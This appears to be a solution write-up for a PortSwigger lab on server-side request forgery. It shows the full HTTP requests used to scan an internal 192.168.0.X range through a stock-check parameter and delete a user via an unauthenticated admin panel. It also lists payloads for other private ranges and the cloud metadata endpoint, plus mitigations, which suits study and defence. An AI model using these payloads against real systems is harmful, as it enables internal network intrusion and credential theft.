# 📘 PortSwigger Lab: Basic SSRF against another back-end system

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-another-back-end-system  
> 🎯 Topic: Server-Side Request Forgery (SSRF) — attacking internal back-end systems  
> 🧪 Difficulty: Apprentice  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🔗 What Is SSRF](#ssrf)
- [🤝 Trust in the Internal Network](#trust)
- [🌐 Private IP Addresses](#private-ip)
- [🛒 How the Stock Check Feature Works](#stock-check)
- [❌ Vulnerable Logic](#vulnerable-flow)
- [🔍 Step 1 — Intercept the Stock Check Request](#step1)
- [🔍 Step 2 — Send the Request to Intruder and Set the Position](#step2)
- [🔍 Step 3 — Configure the Numbers Payload](#step3)
- [🔍 Step 4 — Start the Attack](#step4)
- [🔍 Step 5 — Find the Admin Interface by Status 200](#step5)
- [🔍 Step 6 — Delete User `carlos` in Repeater](#step6)
- [📨 Example Original Request](#original-request)
- [📨 Example Intruder Request](#intruder-request)
- [📨 Example Modified Request](#modified-request)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🎯 How Intruder Works in This Attack](#intruder)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Use the stock check feature to:

```text
1. Scan the internal 192.168.0.X range (port 8080)
   for an admin interface.

2. Delete the user carlos through the discovered admin interface.
```

---

<a id="theory"></a>

## 🧠 Short Theory

The application can interact with **internal back-end systems** that are not directly reachable by users. Such systems:

- have **private non-routable IPs**;
- are "protected" only by network topology;
- therefore often have a **weak security posture** — internal services frequently run **without authentication**.

Example from the theory: an admin interface exists on an internal host:

```text
http://192.168.0.68/admin
```

Request through the vulnerable parameter:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

The server performs the request on its own behalf and returns the internal response to the user.

---

<a id="idea"></a>

## 🧩 Core Idea

In this lab, the address of the internal service is **unknown** — it must be found.

The attacker does not know which host in the range:

```text
192.168.0.1 ... 192.168.0.255
```

hosts the admin panel on port:

```text
8080
```

So the server is used as a **proxy scanner**: the `stockApi` parameter is iterated over the last IP octet using Burp Intruder. The host returning status `200` with an admin panel body is the target.

---

<a id="ssrf"></a>

## 🔗 What Is SSRF

SSRF is a vulnerability that allows an attacker to make the server send HTTP requests to **unintended locations**.

Key scenarios:

```text
- requests to the server itself (localhost / 127.0.0.1);
- requests to internal backends in private networks;
- requests to cloud metadata (169.254.169.254);
- internal network scanning through the server.
```

The cause is the same: **the application trusts user input as a resource address**.

---

<a id="trust"></a>

## 🤝 Trust in the Internal Network

Internal systems are "protected" only by the fact that external users cannot reach them. But the **application server can**.

Developers of internal services reason like this:

```text
"The network is private and unreachable from outside —
so all requests inside can be considered trusted."
```

Result: internal admin panels and APIs often run **without authentication**.

SSRF breaks this assumption: the attacker uses the server as a bridge between the external world and the internal network:

```text
Attacker ──✗──> 192.168.0.X:8080   (unreachable from outside)

Attacker ──(SSRF)──> Application ──(internal request)──> 192.168.0.X:8080 ✅
```

---

<a id="private-ip"></a>

## 🌐 Private IP Addresses

Private ranges are not routable on the internet:

```text
10.0.0.0/8        (10.0.0.0 – 10.255.255.255)
172.16.0.0/12     (172.16.0.0 – 172.31.255.255)
192.168.0.0/16    (192.168.0.0 – 192.168.255.255)
```

The lab uses the range:

```text
192.168.0.X
```

The admin port:

```text
8080
```

Non-standard ports (8080, 8443, 8000) are commonly used for internal services — easy to miss during shallow testing.

---

<a id="stock-check"></a>

## 🛒 How the Stock Check Feature Works

The shop shows whether an item is in stock. The frontend passes the URL of an internal API to the server:

```text
POST /product/stock
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

The server fetches this URL and returns the response to the user.

The `stockApi` parameter is the SSRF entry point: the user controls the **entire URL**.

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Logic

Simplified:

```python
stock_api = request.form["stockApi"]
response = http_client.get(stock_api)   # no URL validation
return response.body
```

Problems:

```text
1. The URL is taken from user input without validation.
2. No scheme or host restriction.
3. Private IP ranges are not blocked.
4. The internal response is returned to the user.
```

---

<a id="step1"></a>

## 🔍 Step 1 — Intercept the Stock Check Request

1. Open any product page.
2. Start Burp Suite and enable interception (Intercept on).
3. Click:

```text
Check stock
```

4. Intercept the request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

Watch the parameter:

```text
stockApi
```

---

<a id="step2"></a>

## 🔍 Step 2 — Send the Request to Intruder and Set the Position

1. Right-click the request:

```text
Send to Intruder
```

2. Open the:

```text
Intruder
```

tab.

3. Replace the `stockApi` value with:

```text
stockApi=http://192.168.0.1:8080/admin
```

4. Highlight the **last octet of the IP** — the digit `1`:

```text
http://192.168.0.§1§:8080/admin
```

5. Click:

```text
Add §
```

The attack position is ready: only the digit `1` will be fuzzed.

---

<a id="step3"></a>

## 🔍 Step 3 — Configure the Numbers Payload

In the side panel:

```text
Payloads
```

select the payload type:

```text
Numbers
```

and set:

```text
From:   1
To:     255
Step:   1
```

This generates values for the last octet:

```text
1, 2, 3, ..., 255
```

Hosts to be scanned:

```text
192.168.0.1 ... 192.168.0.255
```

---

<a id="step4"></a>

## 🔍 Step 4 — Start the Attack

Click:

```text
Start attack
```

Intruder sends 255 requests:

```text
GET /admin HTTP/1.1
Host: 192.168.0.X:8080
```

through the vulnerable `stockApi` parameter.

The results table shows columns:

```text
Request   Payload   Status   Length   ...
```

---

<a id="step5"></a>

## 🔍 Step 5 — Find the Admin Interface by Status 200

Sort the results by the:

```text
Status
```

column in ascending order.

The single entry with status:

```text
200
```

is the host with the admin interface.

Other hosts return:

```text
404   (service exists, but /admin does not)
500   (error)
```

Conclusion: the admin panel is at `http://192.168.0.X:8080/admin`.

---

<a id="step6"></a>

## 🔍 Step 6 — Delete User `carlos` in Repeater

1. Click the successful request with status `200`.
2. Send it to Repeater:

```text
Right click → Send to Repeater
```

3. Change the path in `stockApi`:

```text
stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
```

4. Click:

```text
Send
```

The lab is marked:

```text
Solved
```

---

<a id="original-request"></a>

## 📨 Example Original Request

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

---

<a id="intruder-request"></a>

## 📨 Example Intruder Request

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

stockApi=http://192.168.0.§1§:8080/admin
```

Attack position:

```text
§1§
```

Payloads:

```text
Type: Numbers
From: 1
To: 255
Step: 1
```

---

<a id="modified-request"></a>

## 📨 Example Modified Request (Repeater)

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

stockApi=http://192.168.0.68:8080/admin/delete?username=carlos
```

Here `192.168.0.68` is an example discovered host (the octet may differ in the lab).

---

<a id="response"></a>

## 📥 Example Result

### Response to the status-200 request (admin panel)

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...

<!DOCTYPE html>
<html>
...
<h1>Users</h1>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
...
```

### Response to the deletion request

```http
HTTP/1.1 200 OK
...
```

and the lab status:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the lab
2. Open a product page
3. Enable interception in Burp Proxy
4. Click "Check stock" and intercept POST /product/stock
5. Send the request to Intruder
6. Replace stockApi with http://192.168.0.1:8080/admin
7. Highlight the last IP octet and add position §1§
8. Configure Numbers: From 1, To 255, Step 1
9. Start the attack
10. Sort by Status — find the 200 entry
11. Send the successful request to Repeater
12. Replace the path with /admin/delete?username=carlos
13. Send — user carlos deleted
14. Lab marked as Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. The User Controls the Full URL

`stockApi` accepts an arbitrary URL without validation.

### 2. The Server Sits Inside the Network

The application can reach private `192.168.0.X` addresses that are unreachable externally.

### 3. Internal Services Trust the Request Source

The admin panel on port 8080 runs without authentication — it is "protected" only by topology.

### 4. The Response Is Returned to the Attacker

The SSRF is not blind: the admin panel content arrives in the HTTP response.

### 5. Intruder Enables Range Scanning

Iterating the last octet turns the server into an internal network scanner.

### 6. The Found Admin Panel Provides a Destructive Action

Through `/admin/delete?username=carlos` the user is deleted.

---

<a id="intruder"></a>

## 🎯 How Intruder Works in This Attack

Burp Intruder automates sending a series of requests with different values in the marked positions.

In this lab:

```text
Position:      last IP octet (192.168.0.§1§:8080/admin)
Payload type:  Numbers
Range:         1–255 step 1
Result:        255 requests, one per host in the range
```

Finding the target:

```text
Status 200 → admin interface found
Status 404 → host exists, but /admin is absent
Status 500 → service responds with an error
```

Tip: also check the response body — the found host should return admin HTML (heading, user list, deletion links).

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When you find an SSRF point, do not stop at `localhost`:

```text
Which private ranges can the server reach?
```

```text
Which ports do internal services listen on (8080, 8443, 8000)?
```

```text
Can I scan a range via Intruder or a script?
```

```text
Are there sensitive functions on internal systems without authentication?
```

SSRF indicators:

```text
stockApi   url    path   dest   redirect   uri
load       src    link   next   image_url  callback
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following can be compared:

### Direct access to the internal address (unreachable)

```text
http://192.168.0.68:8080/admin
```

### SSRF to a specific host

```text
stockApi=http://192.168.0.68:8080/admin
```

### SSRF to other ports

```text
stockApi=http://192.168.0.68:80/admin
stockApi=http://192.168.0.68:8443/admin
```

### SSRF to other private ranges (in real systems)

```text
stockApi=http://10.0.0.1/admin
stockApi=http://172.16.0.1/admin
```

### SSRF to cloud metadata (in real systems)

```text
stockApi=http://169.254.169.254/latest/meta-data/
```

Working solution for this lab:

```text
1. Intruder: 192.168.0.§1§:8080/admin, Numbers 1–255
2. Repeater: http://192.168.0.X:8080/admin/delete?username=carlos
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Scanning the Wrong Port

The admin panel listens on port `8080`, not the standard `80`.

### Mistake 2. Highlighting the Wrong Octet

The position must be on the **last** IP octet (`192.168.0.§1§`), not another number.

### Mistake 3. Wrong Numbers Settings

`From: 1`, `To: 255`, `Step: 1` — otherwise the range is incomplete or too large.

### Mistake 4. Looking at the Wrong Column

Sort by `Status` and look for `200`, not the longest entry or the first response.

### Mistake 5. Checking Only the Status, Ignoring the Body

`200` must come with admin HTML — otherwise it is just another service.

### Mistake 6. Forgetting to Change the Path in Repeater

In Repeater, replace the path with `/admin/delete?username=carlos`, not resend `/admin`.

### Mistake 7. Not Updating Content-Length

When manually changing the request body, ensure `Content-Length` matches the new body (Repeater updates it automatically by default).

### Mistake 8. Too Many Threads

Default settings are enough for 255 requests; aggressive concurrency may trigger defenses.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Accept URLs from the User

Use a server-side allowlist of internal endpoints:

```python
allowed_apis = {
    "stock": "http://internal-stock-api:8080/check",
}
api = allowed_apis[user_input]
```

### 2. Block Private Addresses

```text
127.0.0.0/8        loopback
10.0.0.0/8         private
172.16.0.0/12      private
192.168.0.0/16     private
169.254.169.254    cloud metadata
```

### 3. Validate Scheme and Host

Allow only `http`/`https` and only approved domains, not arbitrary IPs.

### 4. Defend Against DNS Rebinding

Resolve the hostname, validate the IP, then perform the request against that exact IP.

### 5. Authenticate Internal Services

Internal admin panels and APIs must not trust requests just because of their network location.

### 6. Network Segmentation and Egress Filtering

Restrict where the application can connect (network policy, firewall).

### 7. Do Not Return Internal Responses

If the request cannot be forbidden, at least do not reflect its response to the user (reduces impact, but does not remove the vulnerability).

### 8. Log Outgoing Requests

Record the URLs the server fetches to detect scanning behavior.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Opened a product page
- [ ] Intercepted the `POST /product/stock` request
- [ ] Found the `stockApi` parameter
- [ ] Sent the request to Intruder

### Scanning

- [ ] `stockApi` replaced with `http://192.168.0.1:8080/admin`
- [ ] Position added on the last IP octet (`§1§`)
- [ ] Payload: Numbers, From 1, To 255, Step 1
- [ ] Attack started
- [ ] Entry with status 200 found
- [ ] Response body contains the admin interface

### Exploitation

- [ ] Successful request sent to Repeater
- [ ] Path replaced with `/admin/delete?username=carlos`
- [ ] User `carlos` deleted
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved through an SSRF attack on an **internal back-end service**:

```text
1. Intruder scanned 192.168.0.1–255 on port 8080
2. Found a host with status 200 and an admin interface
3. Deleted the user through /admin/delete?username=carlos
```

Main lessons:

```text
SSRF allows using the server as a gateway into the internal network.
```

```text
Internal systems are "protected" only by topology — and often run without authentication.
```

```text
Non-standard ports (8080) are a typical place for internal admin panels.
```

```text
Intruder turns an SSRF point into an internal range scanner.
```

```text
Mitigation: block private ranges and require authentication inside the network.
```

---

[⬆ Back to top](#top)
